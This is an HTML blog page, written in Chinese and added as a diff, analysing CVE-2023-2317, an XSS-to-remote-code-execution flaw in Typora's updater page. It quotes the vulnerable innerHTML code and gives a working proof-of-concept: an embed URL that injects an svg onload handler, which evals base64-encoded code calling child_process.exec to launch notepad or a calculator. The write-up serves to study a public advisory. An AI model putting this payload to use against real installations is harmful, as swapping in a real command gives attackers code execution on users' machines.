@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>giacomo&#39;s journal</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+    <link
+    rel="stylesheet"
+    href="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.css"
+    />
+    <script>hljs.highlightAll();</script>
+    <script>hljs.addPlugin(new CopyButtonPlugin());</script>
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery-3.7.1.min.js"></script>
+
+    
+<script src="/js/bootstrap-transition.js"></script>
+
+    
+<script src="/js/zoom.js"></script>
+
+
+    <style>
+        .markdown-body {
+            box-sizing: border-box;
+            min-width: 200px;
+            max-width: 980px;
+            margin-left: 28%;
+            margin-top: 6%;
+
+            padding: 45px;
+        }
+
+        @media (max-width: 767px) {
+            .markdown-body {
+                padding: 15px;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <header class="header">
+
+    <div class="navbar-left">
+        <div class="avatar">
+            <a href="/">
+                <img src="https://91ac0m0.github.io/img/avatar.jpg"alt="avatar">
+            </a>
+        </div>
+        <div class="nav-title">
+            <a class="nav-brand" href="/">giacomo</a>
+        </div>
+    </div>
+    <div class="navbar-right">
+        <ul class="nav-links">
+            
+                <div class="nav-link">
+                    <a href="/about" class="menu-item-link">
+                        about
+                    </a>
+                </div>
+            
+        </ul>
+
+    </div>
+    
+
+</header>
+
+    <div class = "toc_left">
+	
+    <div id="toc">
+        <!-- <strong class="sidebar-title">目录</strong> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2023-2317"><span class="toc-text">cve 2023 2317</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-text">xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#update-html"><span class="toc-text">update.html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#same-origin-policy"><span class="toc-text">same origin policy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#script"><span class="toc-text">script</span></a></li></ol></li></ol>
+    </div>
+
+</div>
+<article class="markdown-body">
+	<div></div><h2 id="cve-2023-2317"><a href="#cve-2023-2317" class="headerlink" title="cve 2023 2317"></a>cve 2023 2317</h2><p><a target="_blank" rel="noopener" href="https://starlabs.sg/advisories/23/23-2317/">原文章在这里</a></p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>Cross-site scripting 执行了本不应该执行的 js</p>
+<p>恶意的 js 可能来自 server 端没有过滤的数据（存储型），或者点击恶意的链接（反射型）</p>
+<h3 id="update-html"><a href="#update-html" class="headerlink" title="update.html"></a>update.html</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="keyword">class</span>=<span class="string">&quot;btn-group&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;skip-this-version-btn-group&quot;</span> <span class="attr">style</span>=<span class="string">&quot;flex-grow: 2; min-height: 10px;min-width: 10px;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;onSkipUpdate()&quot;</span> <span class="attr">data-label</span>=<span class="string">&quot;1&quot;</span> &gt;</span>Skip This Version<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  </span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;onCancelUpdate()&quot;</span> <span class="attr">data-label</span>=<span class="string">&quot;2&quot;</span> &gt;</span>Remind Me Later<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn-primary&quot;</span> <span class="attr">onClick</span>=<span class="string">&quot;onDownloadUpdate()&quot;</span> <span class="attr">data-label</span>=<span class="string">&quot;3&quot;</span> &gt;</span>Download Update<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// ...</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">var</span> labels = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="built_in">decodeURIComponent</span>(<span class="regexp">/[?&amp;]labels=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>]));        <span class="comment">// [1]</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#sum&quot;</span>).<span class="property">innerText</span> = labels[<span class="number">4</span>] + <span class="string">&quot; &quot;</span> + labels[<span class="number">5</span>].<span class="title function_">replace</span>(<span class="string">&quot;$1&quot;</span>, newVersion).<span class="title function_">replace</span>(<span class="string">&quot;$2&quot;</span>, curVersion);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;[data-label]&quot;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">dom</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    dom.<span class="property">innerHTML</span> = labels[dom.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-label&quot;</span>) - <span class="number">0</span>];     <span class="comment">// [2]</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// ...</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec"><code>exec() </code></a> 用于识别字符串中的正则匹配，找到 lable 参数的内容</p>
+<p><a target="_blank" rel="noopener" href="https://www.w3schools.com/js/js_json_parse.asp"><code>JSON.parce</code></a> 解析成 js object 或 js array，lables 是一个从参数解析出来的数组</p>
+<p><a href="document.querySelector"><code>document.querySelector</code></a> 查找标签 id (# 表示) class (. 表示)</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelectorAll#accessing_the_matches"><code>querySelectorAll</code></a> 查找有 [data-label] 属性的所有标签</p>
+<p><a target="_blank" rel="noopener" href="https://www.microfocus.com/documentation/silk-test/200/en/silktestworkbench-help-en/SILKTEST-21EEFF3F-DIFFERENCEBETWEENTEXTCONTENTSINNERTEXTINNERHTML-REF.html"><code>innerHTML</code></a> returns all text, including html tags, that is contained by an element. 这里可以构造 xss （？</p>
+<h3 id="same-origin-policy"><a href="#same-origin-policy" class="headerlink" title="same origin policy"></a>same origin policy</h3><p><a target="_blank" rel="noopener" href="https://web.dev/same-origin-policy/">同源策略</a> 限制不同来源的 document 和 script 和其他来源的内容交互，using JavaScript to access a document in an iframe 是禁止的。</p>
+<p>如果在 <code>typora://app/typemark/window.html</code>  embed <code>typora://app/typemark/updater/updater.html</code> ，updater 的script 是可以访问 window.html 中的内容的，比如 <code>reqnode</code></p>
+<h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中的 <code>&lt;svg/onload=top.eval(atob(&#39;xxx&#39;))&gt;&lt;/svg&gt;</code>  是 <a target="_blank" rel="noopener" href="https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy">svg injection</a>  在 svg 加载完成后执行 onload 中的 script，eval 一段 base64 编码的 script</p>
+<p>decode 之后是这个 <code>reqnode(&#39;child_process&#39;).exec((&#123;Win32: &#39;notepad %WINDIR%/win.ini&#39;, Linux: &#39;gnome-calculator -e &quot;Typora RCE PoC&quot;&#39;&#125;)[navigator.platform.substr(0,5)])</code> </p>
+<p>根据平台执行命令</p>
+</div>
+</article>
+
+<script src="/js/image_pop_up.js"></script>
+
+	
+
+</body>
+</html>
